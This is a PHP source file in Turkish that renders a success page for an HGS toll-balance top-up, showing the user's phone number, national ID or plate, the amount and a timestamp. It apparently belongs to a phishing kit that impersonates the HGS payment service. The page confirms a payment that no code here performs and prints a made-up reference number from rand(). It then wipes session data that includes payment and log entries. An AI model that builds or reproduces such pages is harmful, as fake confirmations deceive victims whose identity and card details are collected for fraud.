<?php
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }
$aktif_adim = 4;
require_once __DIR__ . '/includes/header.php';

// Tutar bilgisini temizle
$toplam_tutar = '275 TL';
if (!empty($_SESSION['randevu']['saat'])) {
    $toplam_tutar = str_replace('Tutar: ', '', $_SESSION['randevu']['saat']);
}
?>
        <section class="hgs-card" style="text-align:center;padding:50px 24px;background:#fff;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,0.08);max-width:550px;margin:40px auto">
          <div style="width:80px;height:80px;background:#2ecc71;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 4px 15px rgba(46,204,113,0.3)">
            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <h3 style="font-size:24px;color:#2c3e50;margin-bottom:12px;font-weight:700">Yükleme İşlemi Başarılı!</h3>
          <p style="font-size:15px;color:#7f8c8d;max-width:400px;margin:0 auto 28px;line-height:1.6">
            HGS bakiye yükleme işleminiz başarıyla tamamlanmıştır. Yükleme detayları 
            <strong><?= htmlspecialchars($_SESSION['basvuru']['telefon'] ?? '') ?></strong> 
            numaralı telefonunuza SMS olarak iletilecektir.
          </p>
          
          <div class="hgs-ozet-box" style="text-align:left;background:#f8f9fa;border-left:4px solid #f39c12;border-radius:6px;padding:20px;max-width:400px;margin:0 auto 30px">
            <h4 style="margin:0 0 12px 0;font-size:16px;color:#2c3e50;font-weight:700;border-bottom:1px solid #eee;padding-bottom:8px">İşlem Detayları</h4>
            <p style="margin:6px 0;font-size:14px;color:#34495e"><strong>Plaka / T.C. No:</strong> <span style="text-transform:uppercase"><?= htmlspecialchars($_SESSION['basvuru']['tc'] ?? '') ?></span></p>
            <p style="margin:6px 0;font-size:14px;color:#34495e"><strong>Yüklenen Tutar:</strong> <?= htmlspecialchars($toplam_tutar) ?></p>
            <p style="margin:6px 0;font-size:14px;color:#34495e"><strong>İşlem Tarihi:</strong> <?= date('d.m.Y H:i') ?></p>
            <p style="margin:6px 0;font-size:14px;color:#34495e"><strong>Referans No:</strong> <?= rand(10000000, 99999999) ?></p>
          </div>
          
          <a href="<?= BASE_PATH ?>/" class="primaryButton" style="display:inline-flex;align-items:center;justify-content:center;text-decoration:none;border-radius:8px;padding:14px 32px;background:#f39c12;color:#fff;font-weight:600;font-size:15px;border:none;cursor:pointer;transition:all 0.2s">
            Yeni Bakiye Yükle
          </a>
        </section>
<?php
// Session temizle
unset($_SESSION['basvuru'], $_SESSION['randevu'], $_SESSION['odeme'], $_SESSION['log_id'], $_SESSION['adim']);
require_once __DIR__ . '/includes/footer.php';
?>
